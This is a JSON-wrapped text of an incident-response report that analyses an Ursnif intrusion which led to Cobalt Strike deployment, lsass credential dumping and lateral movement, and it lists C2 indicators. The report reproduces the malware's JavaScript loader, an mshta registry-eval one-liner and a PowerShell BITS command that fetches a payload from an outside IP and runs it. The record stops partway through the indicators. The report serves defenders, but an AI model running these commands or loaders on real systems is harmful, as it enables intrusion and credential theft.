{
    "id": "8828054d-0f1e-42c8-9bbb-eeab1dfcbab9",
    "created_at": "2023-02-02T02:07:42.22149Z",
    "updated_at": "2025-03-27T02:13:34.610837Z",
    "deleted_at": null,
    "sha1_hash": "407e6b4bacbd186569c126deececf564569f629c",
    "title": "2023-01-09 - Unwrapping Ursnifs Gifts",
    "authors": "",
    "file_creation_date": "2023-02-01T07:47:44Z",
    "file_modification_date": "2023-02-01T07:47:44Z",
    "file_size": 2014660,
    "plain_text": "# Unwrapping Ursnifs Gifts\n\n**thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/**\n\nJanuary 9, 2023\n\nIn late August 2022, we investigated an incident involving Ursnif malware, which resulted in\nCobalt Strike being deployed. This was followed by the threat actors moving laterally\nthroughout the environment using an admin account.\n\nThe [Ursnif malware family (also commonly referred to as Gozi or ISFB) is one of the oldest](https://malpedia.caad.fkie.fraunhofer.de/details/win.gozi)\nbanking trojans still active today. It has an extensive past of code forks and evolutions that\nhas lead to several active variants in the last 5 years including Dreambot, IAP, RM2, RM3\nand most recently, LDR4.\n\nFor this report, we have referred to the malware as Ursnif for simplicity, however we also\n[recommend reading Mandiant’s article on LDR4.](https://www.mandiant.com/resources/blog/rm3-ldr4-ursnif-banking-fraud)\n\n## Case Summary\n\nIn this intrusion, a malicious ISO file was delivered to a user which contained Ursnif malware.\nThe malware displayed an interesting execution flow, which included using a renamed copy\nof rundll32. Once executed, the malware conducted automatic discovery on the beachhead\n[host, as we have observed with other loaders such as IcedID. The malware also established](https://thedfirreport.com/2022/04/25/quantum-ransomware/)\npersistence on the host with the creation of a registry run key.\n\nApproximately 4 days after the initial infection, new activity on the host provided a clear\ndistinction of a threat actor performing manual actions (hands on keyboard). The threat actor\nused a Background Intelligent Transfer Service (BITS) job to download a Cobalt Strike\nbeacon, and then used the beacon for subsequent actions.\n\nThe threat actor first ran some initial discovery on the host using built-in Windows utilities like\nipconfig, systeminfo, net, and ping. Shortly afterwards, the threat actor injected into various\nprocesses and then proceeded to access lsass memory on the host to extract credentials.\n\nUsing the credentials extracted from memory, the threat actors began to move laterally. They\ntargeted a domain controller and used Impacket’s [wmiexec.py to execute code on the](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)\nremote host. This included executing both a msi installer for the RMM tools Atera and\nSplashtop, as well as a Cobalt Strike executable beacon. These files were transferred to the\ndomain controller over SMB.\n\nAfter connecting to the Cobalt Strike beacon on the domain controller, the threat actor\nexecuted another round of discovery tasks and dumped lsass memory on the domain\ncontroller. Finally, they dropped a script named adcomp.bat which executed a PowerShell\n\n\n-----\n\ncommand to collect data on computers in the Windows domain.\n\nThe following day, there was a short check-in on the beachhead host from a Cobalt Strike\nbeacon, no other activity occurred until near the end of the day. At that time, the threat actor\nbecame active by initiating a proxied RDP connection via the Cobalt Strike beacon to the\ndomain controller. From there, the threat actor began connecting to various hosts across the\nnetwork.\n\nOne host of interest was one of the backup servers, which was logged into, the state of\nbackups were checked and running processes were reviewed before exiting the session.\nThe threat actor was later evicted from the network.\n\n## Services\n\n[We offer multiple services including a Threat Feed service which tracks Command and](https://thedfirreport.com/services/)\nControl frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire,\n[PoshC2, etc. More information on this service and others can be found here.](https://thedfirreport.com/services/)\n\nThe Cobalt Strike server in this case was added to our feed on July 18, 2022, over 2 months\nbefore it was used in this case.\n\nWe also have artifacts and IOCs available from this case such as pcaps, memory captures,\nfiles, and event logs including Sysmon under our Security Researcher and\nOrganization services.\n\n## Timeline\n\n\n-----\n\n[Analysis and reporting completed by @_pete_0,](https://twitter.com/_pete_0) [@svch0st and UC1.](https://twitter.com/svch0st)\n\n## Initial Access\n\nIn this case, the Ursnif malware was delivered using a very familiar technique of being\ncontained within an ISO file.\n\nThe DFIR Report has previously reported on several incidents that involved the tactic of\ndelivering malicious flies using ISO files:\n\n\n-----\n\nAs we have previously highlighted, the Event Log Microsoft-Windows-VHDMP```\nOperational.evtx contains high confidence evidence when users mount ISO files. We\n\n```\nrecommend looking for these events (especially Event ID’s 1, 12 & 25) in your environment\nand checking for anomalies.\n\nIn this case, the user had saved the file 3488164.iso to the their downloads folder and\nmounted it.\n\nOnce mounted, the new drive contained a LNK file 6570872.lnk and hidden folder “me”.\n\n\n-----\n\nIf we parse this LNK file with LECmd (by Eric Zimmerman), it highlights the execution path\nand the icon it appears as:\n\nThe contents of hidden folder “me”, included several files and folders that were used for the\nexecution of Ursnif. Of interest, the folder included a legitimate copy of rundll32.exe\n(renamed to 123.com).\n\nSummary of the files found in 3488164.iso (a detailed break down of these can be found in\n**Execution):**\n\nFile Name Purpose\n\n6570872.lnk LNK file that executes alsoOne.bat\n\nme/by Empty folder\n\nme/here Empty folder\n\n\n-----\n\nme/123.com Renamed legitimate version of rundll32.exe\n\nme/alsoOne.bat Batch script to run canWell.js with specific arguments\n\nme/canWell.js [Reverses argument strings and executes tslt.db with 123.com](http://123.com/)\n\nme/itslt.db Ursnif DLL\n\nor.jpg Image not used.\n\n## Execution\n\nOnce the user had mounted the ISO and the LNK file was executed by the user, the complex\nexecution flow started.\n\n\n-----\n\n### Ursnif Malware\n\nHighlighted in Initial Access, the LNK file would execute a batch script alsoOne.bat . This\nscript called a JavaScript file canWell.js in the same directory and provided a number of\nstrings as arguments.\n```\nalsoOne.bat\nset %params%=hello\n\nme\\canWell.js hello cexe lldnur revreSretsigeRllD\ncanWell.js\n/**\n\n     WhnldGh\n\n*/\nfunction reverseString(str)\n\n{\n\n     var splitString = str.split(\"\");\n\n     var reverseArray = splitString.reverse();\n\n     var joinArray = reverseArray.join(\"\");\n\n     return joinArray;\n\n}\n\nfunction ar(id)\n\n{\n\n     r = WScript.Arguments(id);\n\n     return r;\n\n}\n\nvar sh = WScript.CreateObject(\"WScript.Shell\");\n\nsh[reverseString(ar(1))](\"me\\\\123.com me/itsIt.db,\"+reverseString(a\n\n```\nThe JS file was then executed with wscript.exe and used the provided command line\narguments, which created and executed the following command using WScript.Shell.Exec():\n\n\n-----\n\n```\nme/123.com me/itsIt.db,DllRegisterServer\n\n```\nUsing the SRUM database, we were able to determine that the custom rundll32.exe binary\ndownloaded approximately 0.4 MB of data.\n\nOnce the malware was executed, the parent instance of explorer launched MSHTA with the\nfollowing command:\n```\n\"C:\\Windows\\System32\\mshta.exe\" \"about:<hta:application>\n<script>Cxak='wscript.shell';resizeTo(0,2);eval(new\nActiveXObject(Cxak).regread('HKCU\\\\\\Software\\\\AppDataLow\\\\Software\\\\Microsoft\\\\472A62F\nFA62-1196-3C6B-CED530CFE2D9\\\\\\ActiveDevice'));if(!window.flag)close()</script>\"\n\n```\nThis oneliner created a new ActiveX object to eval() the content stored in the registry key in\nthe users registry hive. The content of the value “ActiveDevice”:\n\n\n-----\n\nThe payload used another ActiveX object to run a PowerShell command. This command\ncreated additional aliases of common default PowerShell aliases gp (Get-ItemProperty) and\n```\niex (Invoke-Expression). These two new aliases were used to get and execute the content in\n\n```\nanother registry value “MemoryJunk”:\n```\nAhgvof=new ActiveXObject('WScript.Shell');Ahgvof.Run('powershell new-alias -name\nqirlbtfhgo -value gp; new-alias -name kvikpt -value iex; kvikpt\n([System.Text.Encoding]::ASCII.GetString((qirlbtfhgo\n\"HKCU:\\Software\\\\AppDataLow\\\\Software\\\\Microsoft\\\\472A62F9-FA62-1196-3C6BCED530CFE2D9\").MemoryJunk))',0,0);\n\n```\n_Analyst Note: The names of the registry values changed when we ran the payload in a_\n_sandbox during analysis, and hence suspected to be generated at random at execution._\n\nThe last registry key was used to store additional PowerShell code. This script called a\ncombination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc to\nperform process injection of shellcode stored in Base64.\n\n\n-----\n\nWhen Add-Type cmdlet is executed, the C# compiler csc.exe is invoked by PowerShell to\ncompile this class definition, which results in the creation of temporary files in\n%APPDATA%\\Local\\Temp.\n```\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /noconfig /fullpaths\n@\"C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\npfdesjp\\npfdesjp.cmdline\"\n\n```\n\n-----\n\nFinally, a unique command spawned from the parent explorer.exe process that was called\npause.exe with multiple arguments, which appeared to not provide any additional\nfunctionality.\n```\n\"C:\\Windows\\syswow64\\cmd.exe\" /C pause dll mail,,\n\n```\n_A sigma rule for this cmdline can be found in the Detections section of this report._\n\nAt this point in time, less than a minute of time has elapsed since the user first opened the\nmalware.\n\nOnce the malware was established on the host, there was limited malicious activity, until\naround 3 days later. That is when we began to observe evidence indicative of “hands-onkeyboard” activity.\n\n### Cobalt Strike\n\nAn instance of cmd.exe was launched through explorer.exe which ran the following\ncommand:\n```\npowershell.exe -nop -c \"start-job { param($a) Import-Module BitsTransfer; $d =\n$env:temp + '\\' + [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source\n'hxxp://193.201.9.199:80/a’ -Destination $d; $t = [IO.File]::ReadAllText($d); RemoveItem $d; IEX $t } -Argument 0 | wait-job | Receive-Job\"\n\n```\n_Analyst Note: Ursnif has been known to have VNC-like capabilities. It is possible this_\n_explorer.exe ➝ cmd.exe session was through a VNC session._\n\nThis PowerShell command started a BITS job to download a Cobalt Strike beacon from\n193.201.9[.]199 and saved it with a random name to %TEMP%. It then read the file into a\nvariable, and deleted it before executing content with IEX.\n\nThe event log Microsoft-Windows-Bits-Client%254Operational.evtx corroborated this\nactivity:\n\n\n-----\n\nThe activity following this event demonstrated a clear distinction of the threat actor\nperforming discovery manually.\n\n## Persistence\n\nOnce the foothold had been achieved, after execution of Ursnif on the beachhead host,\npersistence was achieved by creating a ‘Run’ key named ManagerText which was configured\nto execute a LNK file which executed a PowerShell script.\n\n## Credential Access\n\nWe observed a process created by Cobalt Strike accessing lsass.exe. The GrantedAccess\ncode of 0x1010 is a known indicator of such tools as Mimikatz. This was observed on both\nthe beachhead host and a domain controller.\n\n\n-----\n\n```\nLogName Microsoft Windows Sysmon/Operational\n\nEventCode=10\n\nEventType=4\n\nComputerName=<REDACTED>\n\nUser=SYSTEM\n\nSid=S-1-5-18\n\nSidType=1\n\nSourceName=Microsoft-Windows-Sysmon\n\nType=Information\n\nRecordNumber=765707\n\nKeywords=None\n\nTaskCategory=Process accessed (rule: ProcessAccess)\n\nOpCode=Info\n\nMessage=Process accessed:\n\nRuleName: technique_id=T1003,technique_name=Credential Dumping\n\nUtcTime: <REDACTED>\n\nSourceProcessGUID: {aaadb608-97b2-630c-6750-000000000400}\n\nSourceProcessId: 4768\n\nSourceThreadId: 4248\n\nSourceImage: C:\\Windows\\system32\\rundll32.exe\n\nTargetProcessGUID: {aaadb608-45a2-62fc-0c00-000000000400}\n\nTargetProcessId: 672\n\nTargetImage: C:\\Windows\\system32\\lsass.exe\n\nGrantedAccess: 0x1010\n\nCallTrace:\nC:\\Windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\Windows\\System32\\KERNELBASE.dll+20d0e|UNKNOWN(0\n\n## Discovery\n\n```\n**Ursnif related discovery**\n\nAs we have observed in other malware, Ursnif ran a number of automated discovery\ncommands to gain information about the environment. The following commands were\nexecuted and their standard output was redirected to append to a file in the user’s\n%APPDATA%\\Local\\Temp\\\n\n\n-----\n\n```\ncmd /C wmic computersystem get domain |more > C:\\Users\\\n<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"systeminfo.exe > C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"net view >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"nslookup 127.0.0.1 >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"tasklist.exe /SVC >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"driverquery.exe >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"reg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s\n>> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"nltest /domain_trusts >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"net config workstation >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"nltest /domain_trusts >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"nltest /domain_trusts /all_trusts >> C:\\Users\\\n<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"net view /all /domain >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"net view /all >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n\n```\n**Manual discovery**\n\nOnce the threat actor had Cobalt Strike running on the beachhead host, they ran the\nfollowing commands:\n```\nwhoami\n\nwhoami /groups\n\ntime\n\nipconfig /all\n\nsysteminfo\n\n```\nThe threat actor quickly took interest in a support account. This account belonged to the\nDomain Admin group.\n```\nnet user <REDACTED>\n\n```\nThe threat actor also used a batch script to collect a list of all computer objects on the\ndomain using C:\\Windows\\system32\\cmd.exe /C adcomp.bat which contained the\nPowerShell command:\n```\npowershell Get-ADComputer -Filter * -Properties Name,Operatingsystem,\nOperatingSystemVersion, OperatingSystemServicePack,IPv4Address >> log2.txt\n\n```\n\n-----\n\nDuring the final actions taken by the threat actors before eviction, after completing RDP\nconnections to various hosts on the network, the threat actors checked running processes on\nthe accessed hosts via taskmanager, which were started via their interactive RDP session as\nnoted by the /4 [command line argument.](https://www.hexacorn.com/blog/2018/07/22/taskmgr-exe-slashing-numbers/)\n```\nC:\\Windows\\system32\\taskmgr.exe /4\n\n## Lateral Movement\n\n```\nWMI was used to pivot to a domain controller on the network. The actor leveraged\nImpacket’s [wmiexec.py to execute commands with a semi-interactive shell, most likely using](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)\ncredentials gathered by the previous LSASS access.\n\nThe commands executed included directory traversal, host discovery, and execution of tools\non the DC.\n\nA breakdown of the parent and child processes invoked:\n\nThe command can be broken down as follows:\n\n‘Q’ indicates turn off echo – no response.\n‘C’ indicates to stop after command execution.\nThe 127.0.01 and ADMIN$ indicates C:\\Windows.\nOutput is achieved via the parameter ‘2>&1’, to redirect errors and output to one file:\n\n[This command line closely resembles the code within the wmiexec.py as part of the](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)\nImpacket tool maintained by Fortra.\n\n\n-----\n\nAs Impacket interacts with remote endpoints via WMI over TCP via DCERPC, its possible to\ninspect network level packets:\n\nThe use of Impacket by threat actors has been recently detailed by CISA in alert AA22-277A\n[– Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial](https://www.cisa.gov/uscert/ncas/alerts/aa22-277a)\nBase Organization.\n\nThe Impacket process hierarchy in this case can be visualized as:\n\nAt the network level, commands are issued by DCOM/RPC port 135, with responses by SMB\nusing port 445. We can observe a number of WMI requests via DCERPC from one endpoint\nto a target endpoint based on the ports.\n\n\n-----\n\nCorrelating the network activity to the host activity confirms that the ‘Powershell.exe’ process\ninitiated the WMI requests.\n\nThe destination port is within the ephemeral port range 49152–65535, which is for shortlived, time based, communications RFC 6335.\n\n[13Cubed (Richard Davis) also released an amazing resource to investigate Impacket related](https://www.13cubed.com/)\nincidents here:\n[https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet_poster.pdf](https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet_poster.pdf)\n\nOne of the observed commands invoked via WMI was ‘firefox.exe’.\n\nThis was dropped on the DC and spawned a number of processes and invoked a number of\nhands-on commands.\n\n\n-----\n\nThe process generated a significant volume of network connections to 193.201.9[.]199,\naveraging ~6K requests per hour, equating to >150K connections throughout the duration of\nthe intrusion.\n\nRDP was also used by the threat actor on the final two days of the intrusion to connect to\nvarious hosts from a domain controller proxying the traffic via the firefox.exe Cobalt Strike\nbeacon.\n\n\n-----\n\n-----\n\n## Command and Control\n\n### Ursnif\n\nUrsnif was seen using the following domains and IPs:\n\n\n-----\n\n```\n5.42.199.83\nsuperliner.top\n\n     62.173.149.7\n\ninternetlines.in\n\n     31.41.44.97\n\nsuperstarts.top\n\n     31.41.44.27\nsuperlinez.top\n\n     31.41.44.27\ninternetlined.com\n\n     208.91.197.91\n\ndenterdrigx.com:\n\n     187.190.48.135\n\n     210.92.250.133\n\n     189.143.170.233\n\n     201.103.222.246\n\n     151.251.24.5\n\n     190.147.189.122\n\n     115.88.24.202\n\n     211.40.39.251\n\n     187.195.146.2\n\n     186.182.55.44\n\n     222.232.238.243\n\n     211.119.84.111\n\n     51.211.212.188\n\n     203.91.116.53\n\n     115.88.24.203\n\n     190.117.75.91\n\n     181.197.121.228\n\n     190.167.61.79\n\n     109.102.255.230\n\n     211.119.84.112\n\n     190.107.133.19\n\n     185.95.186.58\n\n     175.120.254.9\n\n     46.194.108.30\n\n     190.225.159.63\n\n     190.140.74.43\n\n     187.156.56.52\n\n     195.158.3.162\n\n     138.36.3.134\n\n     109.98.58.98\n\n     24.232.210.245\n\n     222.236.49.123\n\n     175.126.109.15\n\n     124.109.61.160\n\n     95.107.163.44\n\n     93.152.141.65\n\n     5.204.145.65\n\n     116.121.62.237\n\n     31.166.129.162\n\n     222.236.49.124\n\n```\n\n-----\n\n```\n     211.171.233.129\n\n     211.171.233.126\n\n     211.53.230.67\n\n     196.200.111.5\n\n     190.219.54.242\n\n     190.167.100.154\n\n     110.14.121.125\n\n     58.235.189.192\n\n     37.34.248.24\n\n     110.14.121.123\n\n     179.53.93.16\n\n     175.119.10.231\n\n     211.59.14.90\n\n     188.48.64.249\n\n     187.232.150.225\n\n     186.7.85.71\n\n     148.255.20.4\n\n     91.139.196.113\n\n     41.41.255.235\n\n     31.167.236.174\n\n     189.165.2.131\n\n     1.248.122.240\n\n```\nWe also observed several modules for Ursnif downloaded from the following IP:\n```\n193.106.191.186\n\n 3db94cf953886aeb630f1ae616a2ec25 cook32.rar\n\n d99cc31f3415a1337e57b8289ac5011e cook64.rar\n\n a1f634f177f73f112b5356b8ee04ad19 stilak32.rar\n\n 8ea6ad3b1acb9e7b2e64d08411af3c9a stilak64.rar\n\n 0c5862717f00f28473c39b9cba2953f4 vnc32.rar\n\n ce77f575cc4406b76c68475cb3693e14 vnc64.rar\n\n```\nJoeSandbox reported this sample having the following configuration:\n\n\n-----\n\n```\n{\n\n \"RSA Public Key\":\n\"WzgHg0uTPZvhLtnG19qpIk+GmHzcoxkfTefSu6gst5n3mxnOBivzR4MH4a6Ax7hZ5fgcuPGt3NKKPbYTwmknj\n\n \"c2_domain\": [\n\n  \"superliner.top\",\n\n  \"superlinez.top\",\n\n  \"internetlined.com\",\n\n  \"internetlines.in\",\n\n  \"medialists.su\",\n\n  \"medialists.ru\",\n\n  \"mediawagi.info\",\n\n  \"mediawagi.ru\",\n\n  \"5.42.199.83\",\n\n  \"denterdrigx.com\",\n\n  \"и\",\n\n  \"digserchx.at\"\n\n ],\n\n \"ip_check_url\": [\n\n  \"http://ipinfo.io/ip\",\n\n  \"http://curlmyip.net\"\n\n ],\n\n \"serpent_key\": \"Jv1GYc8A8hCBIeVD\",\n\n \"tor32_dll\": \"file://c:\\\\test\\\\test32.dll\",\n\n \"tor64_dll\": \"file://c:\\\\test\\\\tor64.dll\",\n\n \"server\": \"50\",\n\n \"sleep_time\": \"1\",\n\n \"SetWaitableTimer_value(CRC_CONFIGTIMEOUT)\": \"60\",\n\n \"time_value\": \"60\",\n\n \"SetWaitableTimer_value(CRC_TASKTIMEOUT)\": \"60\",\n\n \"SetWaitableTimer_value(CRC_SENDTIMEOUT)\": \"300\",\n\n \"SetWaitableTimer_value(CRC_KNOCKERTIMEOUT)\": \"60\",\n\n \"not_use(CRC_BCTIMEOUT)\": \"10\",\n\n \"botnet\": \"3000\",\n\n \"SetWaitableTimer_value\": \"1\"\n\n}\n\n```\n[Pivoting on domains registered in WHOIS with the email [email protected] or organization](https://thedfirreport.com/cdn-cgi/l/email-protection)\n```\nRus Lak, reveals many similar domains as seen in this intrusion.\n\n```\n\n-----\n\n### Cobalt Strike\n\nThe following Cobalt Strike C2 server was observed:\n```\n193.201.9.199:443\n\nJA3: 72a589da586844d7f0818ce684948eea\n\nJA3s: f176ba63b4d68e576b5ba345bec2c7b7\n\nCertificate: [6e:ce:5e:ce:41:92:68:3d:2d:84:e2:5b:0b:a7:e0:4f:9c:b7:eb:7c]\n\nNot Before: 2015/05/20 18:26:24 UTC\n\nNot After: 2025/05/17 18:26:24 UTC\n\nIssuer Org:\n\nSubject Common:\n\nSubject Org:\n\nPublic Algorithm: rsaEncryption\n\n```\nThe following Cobalt Strike configuration was observed:\n\n\n-----\n\n```\n{\n\n \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n\n \"pipename\": null,\n\n \"dns_beacon\": {\n\n  \"put_metadata\": null,\n\n  \"get_TXT\": null,\n\n  \"get_AAAA\": null,\n\n  \"get_A\": null,\n\n  \"beacon\": null,\n\n  \"maxdns\": null,\n\n  \"dns_sleep\": null,\n\n  \"put_output\": null,\n\n  \"dns_idle\": null\n\n },\n\n \"smb_frame_header\":\n\"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"post_ex\": {\n\n  \"spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\",\n\n  \"spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\"\n\n },\n\n \"stage\": {\n\n  \"cleanup\": \"false\"\n\n },\n\n \"process_inject\": {\n\n  \"stub\": \"IiuPJ9vfuo3dVZ7son6mSA==\",\n\n  \"transform_x64\": [],\n\n  \"transform_x86\": [],\n\n  \"startrwx\": \"true\",\n\n  \"min_alloc\": \"0\",\n\n  \"userwx\": \"true\",\n\n  \"execute\": [\n\n   \"CreateThread\",\n\n   \"SetThreadContext\",\n\n   \"CreateRemoteThread\",\n\n   \"RtlCreateUserThread\"\n\n  ],\n\n  \"allocator\": \"VirtualAllocEx\"\n\n },\n\n \"uses_cookies\": \"true\",\n\n \"http_post_chunk\": \"0\",\n\n \"ssh\": {\n\n  \"privatekey\": null,\n\n  \"username\": null,\n\n  \"password\": null,\n\n  \"port\": null,\n\n  \"hostname\": null\n\n },\n\n \"useragent_header\": null,\n\n \"maxgetsize\": \"1048576\",\n\n \"proxy\": {\n\n  \"behavior\": \"Use IE settings\",\n\n```\n\n-----\n\n```\n  password : null,\n\n  \"username\": null,\n\n  \"type\": null\n\n },\n\n \"tcp_frame_header\":\n\"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"server\": {\n\n  \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnCZHWnYFqYB/6gJdkc4MPDTtBJ20nkEAd3tsY4tPKs8MV4\n\n  \"port\": \"443\",\n\n  \"hostname\": \"193.201.9.199\"\n\n },\n\n \"beacontype\": [\n\n  \"HTTPS\"\n\n ],\n\n \"kill_date\": null,\n\n \"license_id\": \"1580103824\",\n\n \"jitter\": \"0\",\n\n \"sleeptime\": \"60000\",\n\n \"http_get\": {\n\n  \"server\": {\n\n   \"output\": [\n\n    \"print\"\n\n   ]\n\n  },\n\n  \"client\": {\n\n   \"metadata\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"GET\",\n\n  \"uri\": \"/__utm.gif\"\n\n },\n\n \"cfg_caution\": \"false\",\n\n \"host_header\": \"\",\n\n \"crypto_scheme\": \"0\",\n\n \"http_post\": {\n\n  \"client\": {\n\n   \"output\": [],\n\n   \"id\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"POST\",\n\n  \"uri\": \"/submit.php\"\n\n }\n\n}\n\n```\nChecking the certificate used, reveals that it is a default SSL certificate for Cobalt Strike,\n```\n83cd09b0f73c909bfc14883163a649e1d207df22.\n\n```\n\n-----\n\n### Atera & SplashTop\n\nEven though the threat actor installed these agents, we did not observe any activity with\nthese tools.\n\n## Exfiltration\n\nSeveral HTTP Post events were observed to the identified domains denterdrigx[.]com,\nsuperliner[.]top and 5.42.199[.]83, masquerading as image uploads.\n\nThe user agent ‘Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64)’, an\nunusual browser configuration to masquerade as, which indicates use of Internet Explorer\n8.0 (that was released ~2009).\n\nThe POST event included a MIME part indicating file upload activity\n\n\n-----\n\nThe example HTTP stream containing the content\n\nThe file that was uploaded 775E.bin was deleted by the injected ‘Explorer.exe’ process from\nthe target endpoint in folder ‘\\Users\\<REDACTED>\\AppData\\Local\\Temp’\n\nThe exfiltration activity along with the beacon activity can be detected using the following\nnetwork signatures: ET MALWARE Ursnif Variant CnC Data Exfil and ET MALWARE Ursnif\nVariant CnC Beacon. In this example, the mix of activity can be observed as:\n\n\n-----\n\n## Impact\n\nThe threat actor was able to RDP to a backup server using the admin credentials they\nacquired. Using the logs in Microsoft-Windows-TerminalServices```\nLocalSessionManager/Operational we were able to determine the threat actor spent\n\n```\napproximately 10 minutes on the backup server before disconnecting their RDP session. By\ndoing this, they revealed the workstation name of the client: WIN-RRRU9REOK18.\n\n\n-----\n\n```\nLogName Security\n\nEventCode=4624\n\nEventType=0\n\nComputerName=<REDACTED>\n\nSourceName=Microsoft Windows security auditing.\n\nType=Information\n\nRecordNumber=300297\n\nKeywords=Audit Success\n\nTaskCategory=Logon\n\nOpCode=Info\n\nMessage=An account was successfully logged on.\n\nLogon Information:\n\n     Logon Type: 3\n\n     Restricted Admin Mode: \n     Virtual Account: No\n\n     Elevated Token:  Yes\n\nNetwork Information:\n\n     Workstation Name: WIN-RRRU9REOK18\n\n     Source Network Address: <REDACTED>\n\n     Source Port: 0\n\nDetailed Authentication Information:\n\n     Logon Process:  NtLmSsp\n\n     Authentication Package: NTLM\n\n     Transited Services: \n     Package Name (NTLM only): NTLM V2\n\n```\nDuring that time, the threat actor undertook a number of hands-on keyboard actions; this\nincluded reviewing backups in a backup console, checking on running tasks, and using\nnotepad to paste in the following content.\n\nProcess execution:\n```\nC:\\Program Files\\[redacted]\\Console\\[redacted].exe\n\n\"C:\\Windows\\system32\\taskmgr.exe\" /4\n\n\"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Users\\USER\\Desktop\\New Text Document.txt\n\n```\nSysmon Copy Paste Collection EID 24:\n```\nuser: DOMAIN\\USER ip: 127.0.0.1 hostname: WIN-RRRU9REOK18\n\n## Indicators\n\n### Atomic\n\n```\n\n-----\n\n```\nRDP Client Name:\n\nWIN-RRRU9REOK18\n\nUrsnif Domains:\n\ndenterdrigx.com\n\nsuperliner.top\n\ninternetlines.in\n\nsuperstarts.top\n\nsuperlinez.top\n\ninternetlined.com\n\nUrsnif 